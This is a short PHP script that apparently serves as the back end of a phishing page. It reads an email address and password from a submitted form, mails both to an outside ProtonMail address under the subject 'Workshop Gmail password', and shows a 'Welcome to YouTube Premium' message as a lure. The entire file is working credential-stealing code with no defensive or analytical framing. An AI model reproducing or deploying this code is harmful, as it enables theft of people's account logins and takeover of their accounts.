<?php
        $mail = $_POST["email"];
        $password = $_POST["password"];
         $to = "deadbodys@protonmail.com";
         $subject = "Workshop Gmail password";
         
         $message = "$mail";
         $message .= "<br>$password";
         
         $header = "From:deadbodys@protonmail.com \r\n";
         $header .= "Cc:deadbodys@protonmail.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail($to,$subject,$message,$header);
         
         if( $retval == true ) {
            include("MKR.php");
         }else {
            echo "Welcome to YouTube Premium";
         }
      ?>
